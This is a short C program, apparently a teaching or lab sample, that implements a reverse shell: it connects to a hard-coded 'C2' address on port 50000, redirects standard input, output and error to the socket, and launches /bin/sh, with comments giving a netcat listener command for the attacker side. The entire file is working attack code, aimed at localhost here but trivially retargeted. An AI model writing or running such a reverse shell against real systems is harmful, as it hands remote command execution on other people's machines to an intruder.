// 1. enter the following command: nc -lvvnp 50000
// 2. run the program in a new terminal
// 3. if the connection was successful, commands can be entered in the first terminal

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <unistd.h>

#define C2_IP "127.0.0.1"
#define C2_Port 50000

int main() {
  int sock;
  struct sockaddr_in server;

  // create socket
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    fprintf(stderr, "[e] socket() error: %d\n", errno);
    return 1;
  }

  // configure attackers address
  server.sin_family = AF_INET;
  server.sin_port = htons(C2_Port);
  server.sin_addr.s_addr = inet_addr(C2_IP);

  // connect to attackers server
  if (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {
    fprintf(stderr, "[e] connect() error: %d\n", errno);
    return 1;
  }

  // duplicate file descriptors
  dup2(sock, 0); // stdin
  dup2(sock, 1); // stdout
  dup2(sock, 2); // stderr

  // execute shell
  execve("/bin/sh", NULL, NULL);
  
  return 0;
}
